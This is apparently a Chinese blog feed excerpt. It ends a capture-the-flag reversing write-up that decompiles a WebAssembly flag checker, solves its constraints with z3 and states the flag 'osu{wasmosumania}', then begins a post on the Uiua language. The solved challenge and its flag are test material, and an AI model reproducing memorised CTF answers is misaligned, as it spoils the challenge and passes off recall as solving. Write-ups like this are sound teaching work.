h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ha</span>:int = fa * ga;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ia</span>:int = <span class="number">449280</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ja</span>:int = ha;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ka</span>:int = ia;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">la</span>:int = ja == ka;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ma</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">na</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oa</span>:int = la &amp; na;</span><br><span class="line">  y = ma;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(oa)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pa</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qa</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ra</span>:int = pa * qa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sa</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ta</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ua</span>:int = sa * ta;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">va</span>:int = ra + ua;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wa</span>:int = <span class="number">724</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xa</span>:int = va;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ya</span>:int = wa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">za</span>:int = xa == ya;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ab</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">bb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">cb</span>:int = za &amp; bb;</span><br><span class="line">  y = ab;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(cb)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">db</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">eb</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fb</span>:int = db * eb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">gb</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">hb</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ib</span>:int = gb * hb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">jb</span>:int = fb + ib;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">kb</span>:int = <span class="number">313</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">lb</span>:int = jb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">mb</span>:int = kb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">nb</span>:int = lb == mb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ob</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qb</span>:int = nb &amp; pb;</span><br><span class="line">  y = ob;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(qb)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">rb</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sb</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">tb</span>:int = rb * sb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ub</span>:int = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">vb</span>:int = tb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wb</span>:int = ub;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xb</span>:int = vb == wb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">yb</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">zb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ac</span>:int = xb &amp; zb;</span><br><span class="line">  y = yb;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(ac)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">bc</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">cc</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">dc</span>:int = bc + cc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ec</span>:int = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fc</span>:int = dc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">gc</span>:int = ec;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">hc</span>:int = fc == gc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ic</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">jc</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">kc</span>:int = hc &amp; jc;</span><br><span class="line">  y = ic;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(kc)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">lc</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">mc</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">nc</span>:int = lc - mc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oc</span>:int = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pc</span>:int = nc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qc</span>:int = oc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">rc</span>:int = pc == qc;</span><br><span class="line">  y = rc;</span><br><span class="line">  label <span class="attr">B_a</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sc</span>:int = y;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">tc</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">uc</span>:int = sc &amp; tc;</span><br><span class="line">  <span class="keyword">return</span> uc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">checker</span>(<span class="params">a:int, b:int</span>):int &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">c</span>:int = g_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">d</span>:int = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">e</span>:int = c - d;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">f</span>:int_ptr = e;</span><br><span class="line">  g_a = e;</span><br><span class="line">  f[<span class="number">7</span>] = a;</span><br><span class="line">  f[<span class="number">6</span>] = b;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">g</span>:int = f[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">h</span>:int = e;</span><br><span class="line">  f[<span class="number">5</span>] = h;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">i</span>:int = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">j</span>:int = g &lt;&lt; i;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">k</span>:int = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">l</span>:int = j + k;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">m</span>:int = -<span class="number">16</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">n</span>:int = l &amp; m;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">o</span>:int = e;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">p</span>:&#123; <span class="attr">a</span>:int, <span class="attr">b</span>:int, <span class="attr">c</span>:int, <span class="attr">d</span>:int, <span class="attr">e</span>:int, <span class="attr">f</span>:int, <span class="attr">g</span>:int, <span class="attr">h</span>:int, <span class="attr">i</span>:int, <span class="attr">j</span>:int, <span class="attr">k</span>:int, <span class="attr">l</span>:int &#125; = </span><br><span class="line">    o - n;</span><br><span class="line">  e = p;</span><br><span class="line">  g_a = e;</span><br><span class="line">  f[<span class="number">4</span>] = g;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">q</span>:int = <span class="number">0</span>;</span><br><span class="line">  f[<span class="number">3</span>] = q;</span><br><span class="line">  loop L_b &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">r</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">s</span>:int = f[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">t</span>:int = r;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">u</span>:int = s;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">v</span>:int = t &lt; u;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">w</span>:int = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">x</span>:int = v &amp; w;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">eqz</span>(x)) goto B_a;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">y</span>:int = f[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">z</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">aa</span>:ubyte_ptr = y + z;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ba</span>:int = aa[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ca</span>:int = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">da</span>:int = ba &lt;&lt; ca;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ea</span>:int = da &gt;&gt; ca;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">fa</span>:int = <span class="number">97</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ga</span>:int = ea - fa;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ha</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ia</span>:int = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ja</span>:int = ha &lt;&lt; ia;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ka</span>:int_ptr = p + ja;</span><br><span class="line">    ka[<span class="number">0</span>] = ga;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">la</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ma</span>:int = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">na</span>:int = la + ma;</span><br><span class="line">    f[<span class="number">3</span>] = na;</span><br><span class="line">    <span class="keyword">continue</span> L_b;</span><br><span class="line">  &#125;</span><br><span class="line">  unreachable;</span><br><span class="line">  label <span class="attr">B_a</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oa</span>:int = p.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pa</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qa</span>:int = pa;</span><br><span class="line">  <span class="keyword">if</span> (oa) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ra</span>:int = p.<span class="property">i</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sa</span>:int = <span class="number">0</span>;</span><br><span class="line">  qa = sa;</span><br><span class="line">  <span class="keyword">if</span> (ra) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ta</span>:int = p.<span class="property">l</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ua</span>:int = <span class="number">0</span>;</span><br><span class="line">  qa = ua;</span><br><span class="line">  <span class="keyword">if</span> (ta) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">va</span>:int = p.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wa</span>:int = p.<span class="property">c</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xa</span>:int = p.<span class="property">d</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ya</span>:int = p.<span class="property">e</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">za</span>:int = <span class="title function_">f_b</span>(va, wa, xa, ya);</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ab</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">bb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">cb</span>:int = za &amp; bb;</span><br><span class="line">  qa = ab;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(cb)) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">db</span>:int = p.<span class="property">f</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">eb</span>:int = p.<span class="property">g</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fb</span>:int = p.<span class="property">h</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">gb</span>:int = p.<span class="property">j</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">hb</span>:int = p.<span class="property">k</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ib</span>:int = <span class="title function_">f_c</span>(db, eb, fb, gb, hb);</span><br><span class="line">  qa = ib;</span><br><span class="line">  label <span class="attr">B_c</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">jb</span>:int = qa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">kb</span>:int = f[<span class="number">5</span>];</span><br><span class="line">  e = kb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">lb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">mb</span>:int = jb &amp; lb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">nb</span>:int = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ob</span>:int = f + nb;</span><br><span class="line">  g_a = ob;</span><br><span class="line">  <span class="keyword">return</span> mb;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>(这里只给出最重要的逻辑) 进一步合并精简代码得到以下逻辑:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">global</span> <span class="attr">g_a</span>:int = <span class="number">65536</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_b</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_c</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_d</span>:int = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#include &lt;stdbool.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line">struct &#123;</span><br><span class="line">    int a;</span><br><span class="line">    int b;</span><br><span class="line">    int c;</span><br><span class="line">    int d;</span><br><span class="line">&#125; g;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">f_b</span>(<span class="params">int p.a, int p.c, int p.d, int p.e</span>) &#123;</span><br><span class="line">    int temp = offset_65392; <span class="comment">// 算完字母偏移后偏移存放的地方</span></span><br><span class="line">    int f = <span class="number">16</span>;</span><br><span class="line">    g_d = p.<span class="property">a</span>;</span><br><span class="line">    g_c = p.<span class="property">c</span>;</span><br><span class="line">    g_b = p.<span class="property">d</span>;</span><br><span class="line">    g_a = p.<span class="property">e</span>;</span><br><span class="line">    bool l = g_d == <span class="number">22</span>;</span><br><span class="line">    int o = l &amp; <span class="number">1</span>;</span><br><span class="line">    bool z = g_c + g_b == <span class="number">30</span>;                <span class="comment">//p[2] + p[3] == 30</span></span><br><span class="line">    int ja = g_b * g_a == <span class="number">168</span>;                <span class="comment">//p[3] * p[4] == 168</span></span><br><span class="line">    int ua = g_d + g_c + g_b + g_a == <span class="number">66</span>;    <span class="comment">//p[0] + p[2] + p[3] + p[4] == 66</span></span><br><span class="line">    int va = ua &amp; (ja &amp; (z &amp; o));    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> va &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">&gt;&gt;&gt; a = <span class="title class_">Int</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; c = <span class="title class_">Int</span>(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; d = <span class="title class_">Int</span>(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; e = <span class="title class_">Int</span>(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; s = <span class="title class_">Solver</span>()</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(a == <span class="number">22</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(c + d == <span class="number">30</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(d * e == <span class="number">168</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(a + c + d + e == <span class="number">66</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">check</span>()</span><br><span class="line">sat</span><br><span class="line">&gt;&gt;&gt; m = s.<span class="title function_">model</span>()</span><br><span class="line">&gt;&gt;&gt; m</span><br><span class="line">[a = <span class="number">22</span>, d = <span class="number">12</span>, c = <span class="number">18</span>, e = <span class="number">14</span>]</span><br><span class="line"><span class="comment">//p[0] == &#x27;w&#x27;, p[2] == &quot;s&quot;, p[3] == &quot;m&quot;, p[4] == &quot;o&quot;</span></span><br><span class="line"></span><br><span class="line">#include &lt;stdbool.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line">struct &#123;</span><br><span class="line">    int a;</span><br><span class="line">    int b;</span><br><span class="line">    int c;</span><br><span class="line">    int d;</span><br><span class="line">    int e;</span><br><span class="line">&#125; g;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">f_c</span>(<span class="params">p.f, p.g, p.h, p.j, p.k</span>) &#123;</span><br><span class="line">    int* h = &amp;g.<span class="property">a</span> - <span class="number">32</span>;</span><br><span class="line">    f = p.<span class="property">f</span>;</span><br><span class="line">    g = p.<span class="property">g</span>;</span><br><span class="line">    h = p.<span class="property">h</span>;</span><br><span class="line">    j = p.<span class="property">j</span>;</span><br><span class="line">    k = p.<span class="property">k</span>;</span><br><span class="line">    bool u = k + j + h + g + f == <span class="number">71</span>;</span><br><span class="line">    <span class="keyword">if</span> (u) goto B_a;</span><br><span class="line">    bool la = f * g * h * j * k == <span class="number">449280</span>;</span><br><span class="line">    <span class="keyword">if</span> (la) goto B_a;</span><br><span class="line">    bool za = f * f + g * g == <span class="number">724</span>;</span><br><span class="line">    <span class="keyword">if</span> (za) goto B_a;</span><br><span class="line">    bool pb = h * h + j * j == <span class="number">313</span>;</span><br><span class="line">    <span class="keyword">if</span> (pb) goto B_a;</span><br><span class="line">    bool xb = k * k == <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> (xb) goto B_a;</span><br><span class="line">    bool gc = f + h == <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span> (gc) goto B_a;</span><br><span class="line">    bool rc = f - j == <span class="number">5</span>;</span><br><span class="line">    <span class="attr">B_a</span>:</span><br><span class="line">    int uc = rc &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> uc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; g = <span class="title class_">Int</span>(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; f = <span class="title class_">Int</span>(<span class="string">&quot;f&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; h = <span class="title class_">Int</span>(<span class="string">&quot;h&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; j = <span class="title class_">Int</span>(<span class="string">&quot;j&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; k = <span class="title class_">Int</span>(<span class="string">&quot;k&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; sol = <span class="title class_">Solver</span>()</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(k + j + h + g + f == <span class="number">71</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f * g * h * j * k == <span class="number">449280</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f * f + g * g == <span class="number">724</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(h * h + j * j == <span class="number">313</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(k == <span class="number">8</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f + h == <span class="number">30</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f - j == <span class="number">5</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">check</span>()</span><br><span class="line">sat</span><br><span class="line">&gt;&gt;&gt; m = sol.<span class="title function_">model</span>()</span><br><span class="line">&gt;&gt;&gt; m</span><br><span class="line">[k = <span class="number">8</span>, f = <span class="number">18</span>, j = <span class="number">13</span>, g = <span class="number">20</span>, h = <span class="number">12</span>]</span><br><span class="line"><span class="comment">//p[5] == &quot;s&quot;, p[6] == &quot;u&quot;, p[7] == &quot;m&quot;, p[9] == &quot;n&quot;, p[10] == &quot;i&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int <span class="title function_">checker</span>(<span class="params">int base, int lenth</span>) &#123;</span><br><span class="line">    int* f = offset_65440;</span><br><span class="line">    g_a = offset_65440;</span><br><span class="line">    f[<span class="number">7</span>] = base_65472;</span><br><span class="line">    int h = offset_65440;</span><br><span class="line">    f[<span class="number">5</span>] = h;</span><br><span class="line">    int n = ((lenth &lt;&lt; <span class="number">2</span>) + <span class="number">15</span>) &amp; 0b.... <span class="number">1111</span> <span class="number">0000</span>;</span><br><span class="line">    int o = offset_65440;</span><br><span class="line">    struct &#123;</span><br><span class="line">        int a;</span><br><span class="line">        int b;</span><br><span class="line">        int c;</span><br><span class="line">        int d;</span><br><span class="line">        int e;</span><br><span class="line">        int f;</span><br><span class="line">        int g;</span><br><span class="line">        int h;</span><br><span class="line">        int i;</span><br><span class="line">        int j;</span><br><span class="line">        int k;</span><br><span class="line">        int l;</span><br><span class="line">    &#125; p = &#123;offset_65392&#125;;</span><br><span class="line">    g_a = offset_65392;</span><br><span class="line">    f[<span class="number">4</span>] = lenth;</span><br><span class="line">    int q = <span class="number">0</span>;</span><br><span class="line">    offset_input = q;</span><br><span class="line">    <span class="keyword">while</span> (offset_input &lt; lenth) &#123;</span><br><span class="line">        int now_char = *(f[<span class="number">7</span>] + offset_input);</span><br><span class="line">        p[offset_input &lt;&lt; <span class="number">2</span>] = now_char - <span class="number">97</span>;</span><br><span class="line">        offset_input += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑</span></span><br><span class="line">    <span class="comment">//取每位字母对&#x27;a&#x27;的偏移</span></span><br><span class="line">    <span class="comment">//===========================</span></span><br><span class="line"></span><br><span class="line">    int qa = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (p.<span class="property">b</span> == <span class="number">0</span>) &#123;                                        <span class="comment">//input[1]  == &#x27;a&#x27;</span></span><br><span class="line">        qa = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!p.<span class="property">i</span> == <span class="number">0</span>) &#123;                                <span class="comment">//input[8]  == &#x27;a&#x27;</span></span><br><span class="line">            qa = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!p.<span class="property">l</span>) &#123;                                    <span class="comment">//input[11] == &#x27;a&#x27;</span></span><br><span class="line">                int cb = <span class="title function_">f_b</span>(p.<span class="property">a</span>, p.<span class="property">c</span>, p.<span class="property">d</span>, p.<span class="property">e</span>) &amp; <span class="number">1</span>;</span><br><span class="line">                qa = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (cb == <span class="number">1</span>) &#123;</span><br><span class="line">                    qa = <span class="title function_">f_c</span>(p.<span class="property">f</span>, p.<span class="property">g</span>, p.<span class="property">h</span>, p.<span class="property">j</span>, p.<span class="property">k</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset_65392 =&gt; offset_65440;</span><br><span class="line">    g_a = offset_65472;</span><br><span class="line">    <span class="keyword">return</span> qa &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p[5] == &quot;s&quot;, p[6] == &quot;u&quot;, p[7] == &quot;m&quot;, p[9] == &quot;n&quot;, p[10] == &quot;i&quot;</span></span><br><span class="line"><span class="comment">// p[0] == &#x27;w&#x27;, p[2] == &quot;s&quot;, p[3] == &quot;m&quot;, p[4] == &quot;o&quot;</span></span><br><span class="line"><span class="comment">// osu&#123;wasmosumania&#125;</span></span><br></pre></td></tr></table></figure>

<p>部分逻辑要是不确定可以再使用调试功能进行猜想验证 而wasm中的load指令指的是从memories中取出数据 例如:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-195435.png" alt="image-20240304195435263"></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-195539.png" alt="image-20240304195538986" style="zoom:50%;" />
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>古神语(Uiua)之研究</title>
    <url>/2024/03/05/%E5%8F%A4%E7%A5%9E%E8%AF%AD%E4%B9%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>在NBCTF2023遇到了很奇怪的一坨 题目给了一个图片文件和一个<code>.ua</code>文件 那时候一直没搞懂.ua是什么 最近在DC群组遇到了出题人 他提示: </p>
<p>[uiua.org]: uiua.org	“Uiua (wee-wuh 🔉) is a general purpose, stack-based, array-oriented programming language”</p>
<p> 从此开启了 <del>古神语之旅</del> 一种栈机语言的研究(<del>实际上才研究了两天</del>) 视该语言后续在CTF中遇到的频率或者发现了什么独特的用途而更新该研究</p>
<span id="more"></span>

<h3 id="Uiua"><a href="#Uiua" class="headerlink" title="Uiua"></a>Uiua</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>如官网所说 这是一种基于<code>Rust</code>的栈机语言 但是同时也是一种功能十分强大的面向数组语言(对数组的处理能力极强且完备) 同时还内置对音频和视频的生成和处理 经过这两天的研究我发现其实用性其实非常强 只是因为使用了各种奇怪的字符让人觉得不是很正经 但是其实所有的符号都有对应的英文指令</p>
<h4 id="基本特性"><a href="#基本特性" class="headerlink" title="基本特性"></a>基本特性</h4><p>第一个不得不提的 <del>构式</del> 特性就是对不分行(该语言对格式敏感)的一条语句解释器的阅读顺序是由右到左 对多条语句的是由上至下</p>
<p>由于其基于栈 变量名之类的实际上不重要 但是也提供了定义变量名与相关值的相关操作 定义的变量不会储存于栈中(<code>?</code> 用于打印当前栈的信息):</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-212827.png" alt="image-20240305212820170"></p>
<p>提供了一种类似Wasm 同时又比Wasm便捷的编程体验</p>
<p>同时由于所有的运算都基于栈 作为操作指令参量的栈中数据在参与完运算后如果没有特殊操作都会直接销毁(并不<code>pop</code>到哪些变量中 当然也可以添加<code>pop</code>操作) </p>
<p>例如:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/05/20240305-214009.png" alt="image-20240305214009805"></p>
<p>从这里也可以看出运算的顺序是<code>op(value-second-top-to-stack) with value-top-to-stack</code> </p>
<p>如上面所说 这是一个面向数组的语言 几乎所有功能和数组都密切相关 而Uiua提供了类似<code>numpy</code>库中的矩阵操作用以处理数组形成的矩阵</p>
<p>对于三维矩阵若其第1, 2维的长度均超过20且第3维为3或4就可以生成对应的RGB通道或RGB-Alpha通道图片 <del>而音频 我没有研究</del></p>
<h4 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h4><h5 id="NBCTF2023-rev-wee-woo"><a href="#NBCTF2023-rev-wee-woo" class="headerlink" title="[NBCTF2023&#x2F;rev&#x2F;wee-woo]"></a>[NBCTF2023&#x2F;rev&#x2F;wee-woo]</h5><p>题目给出的古神语:</p>
